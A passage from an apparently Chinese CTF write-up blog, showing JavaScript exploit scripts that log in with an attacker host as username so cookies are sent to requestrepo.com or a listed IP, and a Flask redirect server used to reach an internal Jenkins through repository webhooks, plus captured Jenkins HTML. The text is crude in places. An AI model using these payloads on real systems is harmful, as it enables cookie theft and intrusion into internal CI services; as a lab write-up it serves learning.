loginreq = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>({</span><br><span class="line">    <span class="attr">username</span>: <span class="string">'//z08vedyv.requestrepo.com'</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">'7bbf4ac9596b5662b44db993bd8050dd'</span>,</span><br><span class="line">});</span><br><span class="line"><span class="keyword">const</span> changshu = {</span><br><span class="line">    <span class="attr">method</span>: <span class="string">'POST'</span>,</span><br><span class="line">    <span class="attr">headers</span>: {</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    },</span><br><span class="line">    <span class="attr">body</span>: loginreq,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">evil</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">const</span> loginrep = <span class="keyword">await</span> <span class="title function_">fetch</span>(login, changshu);</span><br><span class="line">        <span class="keyword">if</span> (loginrep.<span class="property">ok</span>) {</span><br><span class="line">            <span class="keyword">const</span> vipResponse = <span class="keyword">await</span> <span class="title function_">fetch</span>(vip, {</span><br><span class="line">                <span class="attr">method</span>: <span class="string">'POST'</span>,</span><br><span class="line">                <span class="attr">headers</span>: {</span><br><span class="line">                    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">                },</span><br><span class="line">                <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>({ <span class="attr">code</span>: <span class="string">"awdawdwadwadwadwa"</span> }),</span><br><span class="line">                <span class="attr">credentials</span>: <span class="string">'include'</span>,</span><br><span class="line">            });</span><br><span class="line">            <span class="comment">// åœ¨è¿™é‡Œä½ å¯ä»¥å¤„ç†vipResponse</span></span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// åœ¨è¿™é‡Œå¤„ç†ç™»å½•å¤±è´¥çš„æƒ…å†µ</span></span><br><span class="line">        }</span><br><span class="line">    } <span class="keyword">catch</span> (error) {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_">evil</span>();</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>ğŸ‘´çˆ±ä½¿ç”¨<a target="_blank" rel="noopener" href="https://www.requestrepo.com/"> Dashboard - requestrepo.com</a> æ”¶ cookies</p>
<p>cnm ä¸å¥½ç”¨ï¼Œè¿˜æ˜¯ vps å¾—åŠ²</p>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030181708.png" alt="å¾®ä¿¡æˆªå›¾_20231030181708"></p>
<p>eeeeeeeeeeeeeeez, ã‚‚ã‚ã„ã‚‚ã‚ã„ã€‚</p>
<p>æœ€å¾Œã® exp æ”¹</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> login = <span class="string">'/login'</span>;</span><br><span class="line"><span class="keyword">const</span> vip = <span class="string">'/vip'</span>;</span><br><span class="line"><span class="keyword">const</span> loginreq = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>({</span><br><span class="line">    <span class="attr">username</span>: <span class="string">'//43.143.192.19:7777'</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">'9aaf577e773320b3548fdc5f37aa6e74'</span></span><br><span class="line">});</span><br><span class="line"><span class="keyword">const</span> changshu = {</span><br><span class="line">    <span class="attr">method</span>: <span class="string">'POST'</span>,</span><br><span class="line">    <span class="attr">headers</span>: {</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    },</span><br><span class="line">    <span class="attr">body</span>: loginreq,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">evil</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">const</span> loginrep = <span class="keyword">await</span> <span class="title function_">fetch</span>(login, changshu);</span><br><span class="line">        <span class="keyword">if</span> (loginrep.<span class="property">ok</span>) {</span><br><span class="line">            <span class="keyword">const</span> vipResponse = <span class="keyword">await</span> <span class="title function_">fetch</span>(vip, {</span><br><span class="line">                <span class="attr">method</span>: <span class="string">'POST'</span>,</span><br><span class="line">                <span class="attr">headers</span>: {</span><br><span class="line">                    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">                },</span><br><span class="line">                <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>({ <span class="attr">code</span>: <span class="string">"awdawdwadwadwadwa"</span> }),</span><br><span class="line">                <span class="attr">credentials</span>: <span class="string">'include'</span>,</span><br><span class="line">            });</span><br><span class="line">            <span class="comment">// åœ¨è¿™é‡Œä½ å¯ä»¥å¤„ç†vipResponse</span></span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// åœ¨è¿™é‡Œå¤„ç†ç™»å½•å¤±è´¥çš„æƒ…å†µ</span></span><br><span class="line">        }</span><br><span class="line">    } <span class="keyword">catch</span> (error) {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_">evil</span>();</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>ç°åœ¨ï¼ŒğŸ‘´å°±æ˜¯æ–°ä¸–ç•Œã®å¡å¯†.</p>
<h1 id="hooks"><span id="hooks"> hooks</span></h1>
<p><a target="_blank" rel="noopener" href="https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/">https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/</a></p>
<h2 id="what-is-webhook"><span id="what-is-webhook"> what is webhookğŸ¤”</span></h2>
<p>Webhook æ˜¯ä¸€ç§é€šè¿‡ HTTP åè®®å®ç°çš„å›è°ƒæœºåˆ¶ï¼Œç”¨äºå°†å®æ—¶äº‹ä»¶å’Œæ•°æ®ä»ä¸€ä¸ªåº”ç”¨ç¨‹åºä¼ é€’åˆ°å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºã€‚Webhook å…è®¸åº”ç”¨ç¨‹åºåœ¨ç‰¹å®šäº‹ä»¶å‘ç”Ÿæ—¶è‡ªåŠ¨é€šçŸ¥å…¶ä»–åº”ç”¨ç¨‹åºï¼Œè¿™ç§é€šçŸ¥æ˜¯é€šè¿‡ HTTP POST è¯·æ±‚è¿›è¡Œçš„ã€‚å®ƒæ˜¯ä¸€ç§ç”¨äºå®ç°å®æ—¶é€šä¿¡å’Œæ•°æ®ä¼ é€’çš„è½»é‡çº§æœºåˆ¶ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ Webhook çš„ä¸»è¦ç‰¹ç‚¹å’Œç”¨é€”ï¼š</p>
<p>äº‹ä»¶é©±åŠ¨é€šçŸ¥ï¼š Webhook ä¸»è¦ç”¨äºäº‹ä»¶é©±åŠ¨çš„é€šçŸ¥ï¼Œä¾‹å¦‚æ–°çš„è®¢å•ã€æ–°çš„æ¶ˆæ¯ã€çŠ¶æ€æ›´æ”¹ç­‰ã€‚å½“ç‰¹å®šäº‹ä»¶å‘ç”Ÿæ—¶ï¼Œæºåº”ç”¨ç¨‹åºå°†å‘é€ HTTP POST è¯·æ±‚åˆ°ç›®æ ‡åº”ç”¨ç¨‹åºçš„ Webhook URLï¼Œé€šçŸ¥ç›®æ ‡åº”ç”¨ç¨‹åºè¿›è¡Œå“åº”ã€‚</p>
<p>å®æ—¶æ€§ï¼š Webhook é€šå¸¸å…·æœ‰ä½å»¶è¿Ÿï¼Œå› ä¸ºå®ƒä»¬æ˜¯å³æ—¶è§¦å‘çš„ã€‚å½“äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œé€šçŸ¥ç«‹å³å‘é€ï¼Œè€Œä¸éœ€è¦è½®è¯¢æˆ–å®šæœŸæ£€æŸ¥ã€‚</p>
<p>è‡ªåŠ¨åŒ–ï¼š Webhook å…è®¸è‡ªåŠ¨åŒ–å¤„ç†äº‹ä»¶å’Œæ•°æ®ï¼Œå‡å°‘äº†æ‰‹åŠ¨å¹²é¢„çš„éœ€è¦ã€‚è¿™å¯¹äºé›†æˆä¸åŒåº”ç”¨ç¨‹åºã€è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹å’Œæé«˜æ•ˆç‡éå¸¸æœ‰ç”¨ã€‚</p>
<p>æ‰©å±•æ€§ï¼š Webhook å¯ä»¥ä¸å„ç§ä¸åŒç±»å‹çš„åº”ç”¨ç¨‹åºå’ŒæœåŠ¡é›†æˆï¼Œä½¿å…¶å…·æœ‰å¾ˆé«˜çš„çµæ´»æ€§å’Œæ‰©å±•æ€§ã€‚</p>
<p>æ•°æ®ä¼ é€’ï¼š Webhook å¯ä»¥ä¼ é€’å„ç§æ•°æ®æ ¼å¼ï¼ŒåŒ…æ‹¬ JSONã€XMLã€è¡¨å•æ•°æ®ç­‰ï¼Œè¿™ä½¿å¾—å®ƒä»¬é€‚ç”¨äºå¤šç§åº”ç”¨åœºæ™¯ã€‚</p>
<p>é‡ç‚¹ğŸ¤ª:webhook åªå…è®¸æˆ‘ä»¬å‘é€ POST è¯·æ±‚ï¼Œæ²¡æ³•æ§åˆ¶è¯·æ±‚çš„ body, ç”šè‡³æ²¡æœ‰ csrf çš„ tokenğŸ˜“</p>
<h2 id="abusing-jenkins-login"><span id="abusing-jenkins-login"> Abusing Jenkins login</span></h2>
<p>ä¸è¯´äººè¯:</p>
<p>Jenkins æ˜¯ä¸€ä¸ªå¼€æºçš„è‡ªåŠ¨åŒ–æœåŠ¡å™¨ï¼Œç”¨äºæ„å»ºã€æµ‹è¯•å’Œéƒ¨ç½²è½¯ä»¶é¡¹ç›®ã€‚å®ƒæä¾›äº†ä¸€ä¸ªçµæ´»çš„å¹³å°ï¼Œä½¿å›¢é˜Ÿèƒ½å¤Ÿè‡ªåŠ¨åŒ–æ•´ä¸ªè½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­çš„å„ç§ä»»åŠ¡ã€‚ä»¥ä¸‹æ˜¯ Jenkins çš„ä¸»è¦ç‰¹ç‚¹å’Œç”¨é€”ï¼š</p>
<p>æŒç»­é›†æˆ (CI) å’ŒæŒç»­äº¤ä»˜ (CD)ï¼š Jenkins é€šè¿‡è‡ªåŠ¨åŒ–æ„å»ºå’Œæµ‹è¯•è¿‡ç¨‹ï¼Œæ”¯æŒæŒç»­é›†æˆå’ŒæŒç»­äº¤ä»˜ï¼Œä½¿å›¢é˜Ÿèƒ½å¤Ÿé¢‘ç¹åœ°ã€å¯é åœ°äº¤ä»˜è½¯ä»¶ã€‚</p>
<p>æ’ä»¶ç”Ÿæ€ç³»ç»Ÿï¼š Jenkins å…·æœ‰å¼ºå¤§çš„æ’ä»¶ç”Ÿæ€ç³»ç»Ÿï¼Œå…è®¸ç”¨æˆ·è½»æ¾åœ°æ‰©å±•å…¶åŠŸèƒ½ã€‚æœ‰æ•°åƒä¸ªå¯ç”¨çš„æ’ä»¶ï¼Œç”¨äºä¸å„ç§å·¥å…·å’ŒæŠ€æœ¯è¿›è¡Œé›†æˆã€‚</p>
<p>åˆ†å¸ƒå¼æ„å»ºï¼š Jenkins æ”¯æŒåˆ†å¸ƒå¼æ„å»ºï¼Œå¯ä»¥å°†æ„å»ºä»»åŠ¡åˆ†å‘åˆ°å¤šä¸ªæ„å»ºä»£ç† (Nodes)ï¼Œä»¥æé«˜æ„å»ºæ€§èƒ½å’Œå¯æ‰©å±•æ€§ã€‚</p>
<p>è‡ªåŠ¨åŒ–éƒ¨ç½²ï¼š Jenkins å¯ä»¥ä¸å„ç§éƒ¨ç½²å·¥å…·å’Œäº‘å¹³å°é›†æˆï¼Œæ”¯æŒè‡ªåŠ¨åŒ–éƒ¨ç½²åˆ°ä¸åŒç¯å¢ƒï¼ŒåŒ…æ‹¬å¼€å‘ã€æµ‹è¯•å’Œç”Ÿäº§ç¯å¢ƒã€‚</p>
<p>å¯è§†åŒ–ç•Œé¢ï¼š Jenkins æä¾›ç›´è§‚çš„ Web ç”¨æˆ·ç•Œé¢ï¼Œç”¨äºç®¡ç†æ„å»ºä»»åŠ¡ã€æŸ¥çœ‹æ„å»ºå†å²å’Œç”ŸæˆæŠ¥å‘Šã€‚</p>
<p>å¤šç§æ„å»ºå·¥å…·æ”¯æŒï¼š Jenkins å¯ä»¥ä¸å„ç§æ„å»ºå·¥å…·é›†æˆï¼ŒåŒ…æ‹¬ Apache Antã€Mavenã€Gradle ç­‰ã€‚</p>
<p>å¤šè¯­è¨€æ”¯æŒï¼š Jenkins æ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€å’ŒæŠ€æœ¯æ ˆï¼Œä½¿å…¶é€‚ç”¨äºå„ç§é¡¹ç›®ã€‚</p>
<p>å®‰å…¨æ€§å’Œæƒé™æ§åˆ¶ï¼š Jenkins å…·æœ‰å¼ºå¤§çš„å®‰å…¨æ€§å’Œæƒé™æ§åˆ¶åŠŸèƒ½ï¼Œå¯ä»¥ç®¡ç†ç”¨æˆ·å’Œè§’è‰²çš„è®¿é—®æƒé™ã€‚</p>
<p>æ—¥å¿—è®°å½•å’ŒæŠ¥å‘Šï¼š Jenkins ç”Ÿæˆè¯¦ç»†çš„æ„å»ºæ—¥å¿—å’ŒæŠ¥å‘Šï¼Œä»¥ä¾¿è¯Šæ–­é—®é¢˜å’Œè¿½è¸ªæ„å»ºè¿›åº¦ã€‚</p>
<p>æ´»è·ƒçš„ç¤¾åŒºå’Œæ”¯æŒï¼š Jenkins æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œæœ‰ä¸€ä¸ªæ´»è·ƒçš„ç¤¾åŒºï¼Œæä¾›æ”¯æŒã€æ–‡æ¡£å’Œæ’ä»¶ã€‚</p>
<p>è¯´äººè¯:ğŸ‘´ä¹Ÿä¸çŸ¥é“</p>
<p>ä¸€ç§ç»•è¿‡å®ƒä»¬çš„æ–¹æ³•ï¼Œä»ç™»å½•é¡µé¢å¼€å§‹ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•æš´åŠ›ç ´è§£ç”¨æˆ·å‡­æ®ï¼Œå› ä¸º Jenkins ç”¨æˆ·åœ¨å…¶è‡ªå·±çš„ç”¨æˆ·æ•°æ®åº“ä¸­è¿›è¡Œç®¡ç†ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–ç¼ºä¹åŸºæœ¬ä¿æŠ¤ï¼ˆä¾‹å¦‚å¯†ç ç­–ç•¥æˆ–é’ˆå¯¹è‡ªåŠ¨åŒ–çš„ä¿æŠ¤ï¼‰çš„ç”¨æˆ·ç®¡ç†æ–¹æ³•ï¼Œè¿™æ˜¯å¾ˆå¸¸è§çš„ã€‚(æœºç¿»ï¼ŒğŸ‘´çœ‹ä¸æ‡‚ğŸæ–‡)</p>
<p>æ€»è€Œè¨€ä¹‹å°±æ˜¯ï¼Œé€šè¿‡ github æˆ– gitlab çš„ webhooks ç»è¿‡ python ä¸­è½¬ï¼Œæ‰“åˆ°é¢˜ç›®çš„å†…ç½‘.</p>
<p>ğŸ‘´çœŸ tm æ˜¯ä¸ª sb, çœ‹ä¸ªæ–‡ç« æ²¡çœ‹å…¨ï¼ŒæŠŠä¸€éƒ¨åˆ† exp æ‹¿å»æ‰“ï¼Œæ­»æ´»æ‰“ä¸é€šï¼Œåæ¥é—®â›°ğŸŒŠgiegie, æ‰çŸ¥é“è¦é€šè¿‡ python å†™ä¸ªé‡å®šå‘ä¸­è½¬æ‰èƒ½æœ‰å›æ˜¾ï¼Œè¯´æ˜¯æœ‰è§†é¢‘æ¼”ç¤ºï¼ŒğŸ‘´tmğŸ‡äº†ï¼Œæ²¡è¿™ä¹ˆ sb å§ï¼Œé˜¿ç±³è¯ºæ–¯.</p>
<h2 id="å¼€æ‰“"><span id="å¼€æ‰“"> å¼€æ‰“ğŸ˜¤</span></h2>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/evil'</span>, methods=[<span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evil</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"http://124.70.33.170:8088/redirect?redirect_url=http://jenkins:8080/"</span>,code=<span class="number">302</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">7777</span>)</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031084325.png" alt="å¾®ä¿¡æˆªå›¾_20231031084325"></p>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031081144.png" alt="å¾®ä¿¡æˆªå›¾_20231031081144"></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head resURL=<span class="string">"/static/e1c81722"</span> data-rooturl=<span class="string">""</span> data-resurl=<span class="string">"/static/e1c81722"</span>&gt;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Dashboard [Jenkins]&lt;/title&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/css/layout-common.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/css/style.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/css/color.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/css/responsive-grid.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"shortcut icon"</span> href=<span class="string">"/static/e1c81722/favicon.ico"</span> <span class="built_in">type</span>=<span class="string">"image/vnd.microsoft.icon"</span> /&gt;&lt;link color=<span class="string">"black"</span> rel=<span class="string">"mask-icon"</span> href=<span class="string">"/images/mask-icon.svg"</span> /&gt;&lt;script&gt;var isRunAsTest=false; var rootURL=<span class="string">""</span>; var resURL=<span class="string">"/static/e1c81722"</span>;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/prototype.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/behavior.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">'/adjuncts/e1c81722/org/kohsuke/stapler/bind.js'</span> <span class="built_in">type</span>=<span class="string">'text/javascript'</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/yahoo/yahoo-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/dom/dom-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/event/event-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/animation/animation-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/dragdrop/dragdrop-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/container/container-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/connection/connection-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/datasource/datasource-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/autocomplete/autocomplete-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/menu/menu-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/element/element-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/button/button-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/storage/storage-min.js"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/hudson-behavior.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/sortable.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;&lt;script&gt;crumb.init(<span class="string">""</span>, <span class="string">""</span>);&lt;/script&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/scripts/yui/container/assets/container.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/scripts/yui/assets/skins/sam/skin.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/scripts/yui/container/assets/skins/sam/container.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/scripts/yui/button/assets/skins/sam/button.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/static/e1c81722/scripts/yui/menu/assets/skins/sam/menu.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> /&gt;&lt;link rel=<span class="string">"search"</span> href=<span class="string">"/opensearch.xml"</span> <span class="built_in">type</span>=<span class="string">"application/opensearchdescription+xml"</span> title=<span class="string">"Jenkins"</span> /&gt;&lt;meta name=<span class="string">"ROBOTS"</span> content=<span class="string">"INDEX,NOFOLLOW"</span> /&gt;&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span> /&gt;&lt;link rel=<span class="string">"alternate"</span> href=<span class="string">"/rssAll"</span> title=<span class="string">"Jenkins:all (all builds)"</span> <span class="built_in">type</span>=<span class="string">"application/rss+xml"</span> /&gt;&lt;link rel=<span class="string">"alternate"</span> href=<span class="string">"/rssAll?flavor=rss20"</span> title=<span class="string">"Jenkins:all (all builds) (RSS 2.0)"</span> <span class="built_in">type</span>=<span class="string">"application/rss+xml"</span> /&gt;&lt;link rel=<span class="string">"alternate"</span> href=<span class="string">"/rssFailed"</span> title=<span class="string">"Jenkins:all (failed builds)"</span> <span class="built_in">type</span>=<span class="string">"application/rss+xml"</span> /&gt;&lt;link rel=<span class="string">"alternate"</span> href=<span class="string">"/rssFailed?flavor=rss20"</span> title=<span class="string">"Jenkins:all (failed builds) (RSS 2.0)"</span> <span class="built_in">type</span>=<span class="string">"application/rss+xml"</span> /&gt;&lt;script src=<span class="string">"/static/e1c81722/scripts/yui/cookie/cookie-min.js"</span>&gt;&lt;/script&gt;&lt;script&gt;</span><br><span class="line">              YAHOO.util.Cookie.<span class="built_in">set</span>(<span class="string">"screenResolution"</span>, screen.width+<span class="string">"x"</span>+screen.height);</span><br><span class="line">            &lt;/script&gt;&lt;script src=<span class="string">"/static/e1c81722/jsbundles/page-init.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;&lt;/head&gt;&lt;body data-model-<span class="built_in">type</span>=<span class="string">"hudson.model.AllView"</span> <span class="built_in">id</span>=<span class="string">"jenkins"</span> <span class="keyword">class</span>=<span class="string">"yui-skin-sam two-column jenkins-2.138"</span> data-version=<span class="string">"2.138"</span>&gt;&lt;a href=<span class="string">"#skip2content"</span> <span class="keyword">class</span>=<span class="string">"skiplink"</span>&gt;Skip to content&lt;/a&gt;&lt;div <span class="built_in">id</span>=<span class="string">"page-head"</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">"header"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"logo"</span>&gt;&lt;a <span class="built_in">id</span>=<span class="string">"jenkins-home-link"</span> href=<span class="string">"/"</span>&gt;&lt;img src=<span class="string">"/static/e1c81722/images/headshot.png"</span> alt=<span class="string">"[Jenkins]"</span> <span class="built_in">id</span>=<span class="string">"jenkins-head-icon"</span> /&gt;&lt;img src=<span class="string">"/static/e1c81722/images/title.png"</span> alt=<span class="string">"Jenkins"</span> width=<span class="string">"139"</span> <span class="built_in">id</span>=<span class="string">"jenkins-name-icon"</span> height=<span class="string">"34"</span> /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">"login"</span>&gt; &lt;a href=<span class="string">"/login?from=%2F"</span>&gt;&lt;b&gt;log <span class="keyword">in</span>&lt;/b&gt;&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">"searchbox hidden-xs"</span>&gt;&lt;form method=<span class="string">"get"</span> name=<span class="string">"search"</span> action=<span class="string">"/search/"</span> style=<span class="string">"position:relative;"</span> <span class="keyword">class</span>=<span class="string">"no-json"</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">"search-box-minWidth"</span>&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">"search-box-sizer"</span>&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">"searchform"</span>&gt;&lt;<span class="built_in">input</span> name=<span class="string">"q"</span> placeholder=<span class="string">"search"</span> <span class="built_in">id</span>=<span class="string">"search-box"</span> <span class="keyword">class</span>=<span class="string">"has-default-text"</span> /&gt; &lt;a href=<span class="string">"https://jenkins.io/redirect/search-box"</span>&gt;&lt;img src=<span class="string">"/static/e1c81722/images/16x16/help.png"</span> style=<span class="string">"width: 16px; height: 16px; "</span> <span class="keyword">class</span>=<span class="string">"icon-help icon-sm"</span> /&gt;&lt;/a&gt;&lt;div <span class="built_in">id</span>=<span class="string">"search-box-completion"</span>&gt;&lt;/div&gt;&lt;script&gt;createSearchBox(<span class="string">"/search/"</span>);&lt;/script&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">"breadcrumbBar"</span>&gt;&lt;tr <span class="built_in">id</span>=<span class="string">"top-nav"</span>&gt;&lt;td <span class="built_in">id</span>=<span class="string">"left-top-nav"</span> colspan=<span class="string">"2"</span>&gt;&lt;link rel=<span class="string">'stylesheet'</span> href=<span class="string">'/adjuncts/e1c81722/lib/layout/breadcrumbs.css'</span> <span class="built_in">type</span>=<span class="string">'text/css'</span> /&gt;&lt;script src=<span class="string">'/adjuncts/e1c81722/lib/layout/breadcrumbs.js'</span> <span class="built_in">type</span>=<span class="string">'text/javascript'</span>&gt;&lt;/script&gt;&lt;div <span class="keyword">class</span>=<span class="string">"top-sticker noedge"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"top-sticker-inner"</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">"right-top-nav"</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">"right-top-nav"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"smallfont"</span>&gt;&lt;a href=<span class="string">"?auto_refresh=true"</span>&gt;ENABLE AUTO REFRESH&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;ul <span class="built_in">id</span>=<span class="string">"breadcrumbs"</span>&gt;&lt;li <span class="keyword">class</span>=<span class="string">"item"</span>&gt;&lt;a href=<span class="string">"/"</span> <span class="keyword">class</span>=<span class="string">"model-link inside"</span>&gt;Jenkins&lt;/a&gt;&lt;/li&gt;&lt;li href=<span class="string">"/"</span> <span class="keyword">class</span>=<span 